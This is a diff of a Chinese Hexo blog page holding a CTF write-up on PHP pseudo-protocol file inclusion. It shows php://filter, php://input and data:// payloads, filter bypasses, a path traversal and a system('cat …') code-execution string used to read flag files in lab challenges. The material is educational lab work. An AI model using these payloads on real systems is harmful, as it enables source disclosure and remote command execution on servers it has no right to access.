@@ -110,22 +110,12 @@
     <article id="post-chenge-first-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/07/02/chenge-first-blog/" class="article-date">
-  <time class="dt-published" datetime="2024-07-02T13:24:44.000Z" itemprop="datePublished">2024-07-02</time>
+  <time class="dt-published" datetime="2024-07-02T13:24:44.353Z" itemprop="datePublished">2024-07-02</time>
 </a>
     
   </div>
   <div class="article-inner">
     
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/07/02/chenge-first-blog/">php伪协议</a>
-    </h1>
-  
-
-      </header>
     
     <div class="e-content article-entry" itemprop="articleBody">
       
@@ -171,7 +161,7 @@
 </tbody></table>
 <h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240513195502314.png" alt="image-20240513195502314"></p>
+<p><img src="/chenge-first-blog/image-20240513195502314.png" alt="image-20240513195502314"></p>
 <p><strong>常用语法</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br></pre></td></tr></table></figure>
 
@@ -182,8 +172,8 @@
 <p><strong>convery.iconv.</strong>*</p>
 <p>用法</p>
 <ul>
-<li>convert.iconv.<input-encoding>.<output-encoding> </li>
-<li>convert.iconv.<input-encoding>&#x2F;<output-encoding></li>
+<li>convert.iconv.<input-encoding>.<output-encoding> </output-encoding></input-encoding></li>
+<li>convert.iconv.<input-encoding>&#x2F;<output-encoding></output-encoding></input-encoding></li>
 </ul>
 <p>支持的编码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure>
@@ -191,10 +181,10 @@
 
 
 <h4 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h4><p><strong>fileinclude</strong></p>
-<p><img src="/images/image-20240513200446217.png" alt="image-20240513200446217"></p>
+<p><img src="/chenge-first-blog/image-20240513200446217.png" alt="image-20240513200446217"></p>
 <p>敏感信息:存在flag.php ,文件目录,language</p>
 <p>F12</p>
-<p><img src="/images/image-20240513205753428.png" alt="image-20240513205753428"></p>
+<p><img src="/chenge-first-blog/image-20240513205753428.png" alt="image-20240513205753428"></p>
 <p>这里用了ai解读了一下	</p>
 <p>这段PHP代码的作用是根据用户的语言偏好设置来加载不同的语言文件，并在最后读取并输出’index.php’文件的内容。下面是对代码的详细解释：</p>
 <ol>
@@ -219,7 +209,7 @@
 <p>cookie</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;名称&quot;</span>: language</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;值&quot;</span>: <span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240513210928969.png" alt="image-20240513210928969"></p>
+<p><img src="/chenge-first-blog/image-20240513210928969.png" alt="image-20240513210928969"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2ZkNTdjMmU4MzhjODVhNDg2NTM2OWJjMWE3YjcwN2ZhfSI7DQo/Pg==</span><br></pre></td></tr></table></figure>
 
 <p>base64解码后</p>
@@ -228,33 +218,33 @@
 
 
 <p><strong>file_include</strong></p>
-<p><img src="/images/image-20240515093042738.png" alt="image-20240515093042738"></p>
-<p><img src="/images/image-20240515093109851.png" alt="image-20240515093109851"></p>
+<p><img src="/chenge-first-blog/image-20240515093042738.png" alt="image-20240515093042738"></p>
+<p><img src="/chenge-first-blog/image-20240515093109851.png" alt="image-20240515093109851"></p>
 <p>直接使用伪协议，发现被过滤了，那就尝试其他过滤器，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.iconv.utf8*.utf16/resource=./check.php</span><br></pre></td></tr></table></figure>
 
 <p>结果发现只是出现了过滤源码</p>
-<p><img src="/images/image-20240515093620463.png" alt="image-20240515093620463"></p>
+<p><img src="/chenge-first-blog/image-20240515093620463.png" alt="image-20240515093620463"></p>
 <p>flag并不在里面</p>
 <p>那么就试试flag.php</p>
-<p><img src="/images/image-20240515093722236.png" alt="image-20240515093722236"></p>
+<p><img src="/chenge-first-blog/image-20240515093722236.png" alt="image-20240515093722236"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=cyberpeace&#123;634065b83d0e7b3821f16e560f8f2755&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>**had a bad day ** </p>
-<p><img src="/images/image-20240517183336417.png" alt="image-20240517183336417"></p>
-<p><img src="/images/image-20240517183323789.png" alt="image-20240517183323789"></p>
+<p><img src="/chenge-first-blog/image-20240517183336417.png" alt="image-20240517183336417"></p>
+<p><img src="/chenge-first-blog/image-20240517183323789.png" alt="image-20240517183323789"></p>
 <p>有可能是伪协议，而且现在知道有两个参数，index ，woofers ， meowers 并且 每次图片都不一样</p>
 <p>所以先尝试·读取index的源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240517183909856.png" alt="image-20240517183909856"></p>
+<p><img src="/chenge-first-blog/image-20240517183909856.png" alt="image-20240517183909856"></p>
 <p>说明可以注入，并且我们的传参被他加上了.php 这样的话就删掉就好了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240517184040072.png" alt="image-20240517184040072"></p>
-<p><img src="/images/image-20240517184120708.png" alt="image-20240517184120708"></p>
+<p><img src="/chenge-first-blog/image-20240517184040072.png" alt="image-20240517184040072"></p>
+<p><img src="/chenge-first-blog/image-20240517184120708.png" alt="image-20240517184120708"></p>
 <p>源码出现了，提取关键部分</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">			<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">					<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -265,11 +255,11 @@
 
 
 
-<p><img src="/images/image-20240517184936308.png" alt="image-20240517184936308"></p>
+<p><img src="/chenge-first-blog/image-20240517184936308.png" alt="image-20240517184936308"></p>
 <p>说明存在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240517185459919.png" alt="image-20240517185459919"></p>
+<p><img src="/chenge-first-blog/image-20240517185459919.png" alt="image-20240517185459919"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> // flag&#123;595fb0aa-4b97-4ed6-abd7-4e256ba49ae1&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -297,7 +287,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　1）eg: http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;         ##会向file中输入文本数据流&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">　　2）eg:http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b   #会向file中输入base64解码后的PD9waHAgcGhwaW5mbygpOz8%2b </span><br></pre></td></tr></table></figure>
 
 <h2 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h2><p>攻防世界：fileclude</p>
-<p><img src="/images/image-20240514142424024.png" alt="image-20240514142424024"></p>
+<p><img src="/chenge-first-blog/image-20240514142424024.png" alt="image-20240514142424024"></p>
 <p>这段PHP代码是一个典型的CTF（Capture The Flag）挑战中的一个环节，通常用于测试参赛者的Web安全知识和漏洞利用技能。下面是对这段代码的详细解释：</p>
 <ol>
 <li><p><code>include(&quot;flag.php&quot;);</code>：这行代码将包含一个名为<code>flag.php</code>的文件，该文件可能包含一个特定的字符串，即“flag”，这是CTF比赛中的常见元素，参赛者需要找到并提交这个flag以证明他们解决了挑战。</p>
@@ -326,13 +316,13 @@
 <p><strong>方法一</strong></p>
 <p>php:&#x2F;&#x2F;input 是可以接受post传参赋予变量的</p>
 <p>这里推荐使用火狐浏览器并下载max hackbar </p>
-<p><img src="/images/image-20240514143243027.png" alt="image-20240514143243027"></p>
+<p><img src="/chenge-first-blog/image-20240514143243027.png" alt="image-20240514143243027"></p>
 <p>构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/image-20240514143547264.png" alt="image-20240514143547264"></p>
-<p><img src="/images/image-20240514143813323.png" alt="image-20240514143813323"></p>
-<p><img src="/images/image-20240514144230635.png" alt="image-20240514144230635"></p>
+<p><img src="/chenge-first-blog/image-20240514143547264.png" alt="image-20240514143547264"></p>
+<p><img src="/chenge-first-blog/image-20240514143813323.png" alt="image-20240514143813323"></p>
+<p><img src="/chenge-first-blog/image-20240514144230635.png" alt="image-20240514144230635"></p>
 <p>base64解码后</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;WRONG WAY!&quot;;</span><br><span class="line">// $flag = cyberpeace&#123;c48634e20f8d5bc6000913931ce2bfa7&#125;</span><br></pre></td></tr></table></figure>
 
@@ -342,9 +332,9 @@
 
 
 
-<p><img src="/images/image-20240514144752108.png" alt="image-20240514144752108"></p>
+<p><img src="/chenge-first-blog/image-20240514144752108.png" alt="image-20240514144752108"></p>
 <p><strong>Web_php_include</strong></p>
-<p><img src="/images/image-20240516154802767.png" alt="image-20240516154802767"></p>
+<p><img src="/chenge-first-blog/image-20240516154802767.png" alt="image-20240516154802767"></p>
 <p>这段PHP代码是一个简单的脚本，它执行以下操作：</p>
 <ol>
 <li><p><code>show_source(__FILE__);</code>: 这行代码使用<code>show_source</code>函数（它是<code>highlight_file</code>函数的别名）来显示当前执行脚本的源代码。<code>__FILE__</code>是一个魔术常量，它返回当前脚本的路径。</p>
@@ -364,17 +354,17 @@
 <p>我们要绕过php:&#x2F;&#x2F;过滤，</p>
 <p><strong>方法一</strong><br>大小写绕过<br>他只禁用了小写，大写依旧可以<br><strong>提醒</strong><br>不要直接使用url栏中的get传参<br>可以使用burp抓包，或者hackbar</p>
 <p>由于不知道flag在哪<br>所以使用命令</p>
-<p><img src="/images/image-20240516155536007.png" alt="image-20240516155536007"></p>
-<p><img src="/images/image-20240516155558779.png" alt="image-20240516155558779"></p>
+<p><img src="/chenge-first-blog/image-20240516155536007.png" alt="image-20240516155536007"></p>
+<p><img src="/chenge-first-blog/image-20240516155558779.png" alt="image-20240516155558779"></p>
 <p>第一个就可以，所以我们可以尝试读取。</p>
 <p>有两办法</p>
 <ul>
-<li><p>1<br><img src="/images/image-20240516155745976.png" alt="image-20240516155745976"></p>
+<li><p>1<br><img src="/chenge-first-blog/image-20240516155745976.png" alt="image-20240516155745976"></p>
 <?php system("cat fl4gisisish3r3.php")?>
-<p>通过查看网站源码<br><img src="/images/image-20240516155855598.png" alt="image-20240516155855598"></p>
+<p>通过查看网站源码<br><img src="/chenge-first-blog/image-20240516155855598.png" alt="image-20240516155855598"></p>
 </li>
 <li><p>2<br>使用fliter<br>?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;fl4gisisish3r3.php</p>
-<p><img src="/images/image-20240516160049925.png" alt="image-20240516160049925"><br>然后再base64解码</p>
+<p><img src="/chenge-first-blog/image-20240516160049925.png" alt="image-20240516160049925"><br>然后再base64解码</p>
 </li>
 </ul>
 <p><strong>方法二</strong><br>通过data:&#x2F;&#x2F;</p>
@@ -389,7 +379,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/07/02/chenge-first-blog/" data-id="cly4g10ea00000kugeyqp164x" data-title="php伪协议" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/07/02/chenge-first-blog/" data-id="cly4g10ea00000kugeyqp164x" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -436,7 +426,7 @@
           </li>
         
           <li>
-            <a href="/2024/07/02/chenge-first-blog/">php伪协议</a>
+            <a href="/2024/07/02/chenge-first-blog/">(no title)</a>
           </li>
         
       </ul>
